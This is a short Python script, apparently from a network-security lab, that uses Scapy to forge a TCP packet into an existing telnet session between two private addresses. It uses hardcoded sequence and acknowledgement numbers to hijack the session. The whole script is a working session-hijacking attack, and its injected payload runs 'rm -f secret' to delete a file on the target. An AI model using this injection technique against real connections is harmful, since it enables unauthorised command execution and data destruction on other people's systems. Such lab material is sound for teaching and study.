
from scapy.all import * 
ip = IP(src="10.0.2.6", dst="10.0.2.7")
tcp = TCP(sport=44848, dport=23, flags="A", seq=86590607, ack=2288579937) 
data = "\r rm -f secret\r"
pkt = ip/tcp/data

ls(pkt)
send(pkt,verbose=0)
